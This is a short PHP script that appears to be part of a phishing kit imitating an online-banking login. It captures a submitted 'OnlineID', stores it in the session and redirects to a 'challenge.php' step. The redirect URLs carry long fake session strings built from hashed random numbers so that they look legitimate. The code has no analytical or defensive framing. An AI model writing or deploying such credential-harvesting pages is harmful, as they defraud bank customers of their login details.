<?php
ini_set("output_buffering",4096);
session_start();

//POST for OnlineID
$onlineID = $_POST['formID'];


//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);


if ($onlineID=="") {
	$errors2=1;

}
else {
	$errors2=0;
}

if (strlen($onlineID)<5) {

$errors2=1;
}
else{
$errors2=0;
}



$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");



if ($errors2==1) {

header("Location: index.php?invalid=$errors2&session=$host$host$host$host$host$host$host").md5(time());
}


else {

//Create session for the onlineID
	$_SESSION['ONLINEID'] = $onlineID;

$initiate="challenge.php?template=Initiate&valid=true&session=$host$host$host$host$host$host$host".md5(time());
header("Location: $initiate");
}

?>